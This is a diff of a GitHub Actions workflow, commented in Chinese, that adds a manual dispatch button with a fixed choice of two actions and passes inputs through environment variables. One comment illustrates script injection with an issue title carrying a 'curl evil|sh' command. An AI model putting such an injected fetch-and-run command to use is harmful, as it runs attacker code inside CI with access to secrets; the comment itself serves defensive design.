@@ -11,7 +11,23 @@ name: on-dispatch
 on:
   repository_dispatch:
     types: [store-event]
+  # 手动按钮。这是 §3.2 搬运**唯一**的两种叫法之一（另一种是 store 侧上传 CI
+  # 发的信标）：队列常驻 draft，没有"发布即搬运"那条自动路了，所以人传完文件
+  # 必须点一次这里。
+  #
+  # why choice 而不是自由文本：choice 的取值由 GitHub 服务端**先校验**（只可能是
+  # 下面 options 里的字面量），到 job 里时已经是一个封闭集合的成员。它随后仍然
+  # 走 env: 传下去、run: 里一个字都不插值 —— 和 store 侧同一个规矩，即使这里
+  # 的输入来自界面而不是 issue 标题。
   workflow_dispatch:
+    inputs:
+      verb:
+        description: 手动跑哪一件事
+        type: choice
+        options:
+          - intake-incoming
+          - reconcile
+        default: intake-incoming
 
 # 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
 # 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
@@ -82,10 +98,9 @@ jobs:
           # 这一条与 store 侧 forward.yml 是同一个理由：`${{ }}` 在 run: 里是
           # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
           STORE_TOKEN: ${{ secrets.GH_PAT }}
-          EVENT: ${{ github.event.client_payload.event || github.event_name }}
+          # 手动按钮时 client_payload 不存在，于是落到第一个分支（verb）。
+          EVENT: ${{ github.event.inputs.verb || github.event.client_payload.event || github.event_name }}
           ISSUE: ${{ github.event.client_payload.issue }}
-          RELEASE_TAG: ${{ github.event.client_payload.releaseTag }}
-          PRERELEASE: ${{ github.event.client_payload.prerelease }}
           SHA: ${{ github.event.client_payload.sha }}
           REF: ${{ github.event.client_payload.ref }}
         run: |
@@ -93,6 +108,6 @@ jobs:
           echo "::add-mask::$STORE_TOKEN"
           "$GITHUB_WORKSPACE/$EXEC_ASSET" handle-dispatch
 
-      # 注意 workflow_dispatch 时 client_payload 是空的，EVENT 因而退化成
-      # 字面量 "workflow_dispatch" —— 那正是 handle-dispatch 的第四个分支
-      # （全量对账，§4.3）。手动点一次 Actions 页面就等于点了一次全量对账。
+      # 注意手动按钮时 client_payload 是空的，EVENT 就是上面那个 verb：
+      # 默认的 intake-incoming = 搬一次队列（§3.2），选 reconcile = 全量对账（§4.3）。
+      # 缺省值刻意选"搬队列"：手动点这个按钮的九成场景是刚往 _incoming 传完文件。
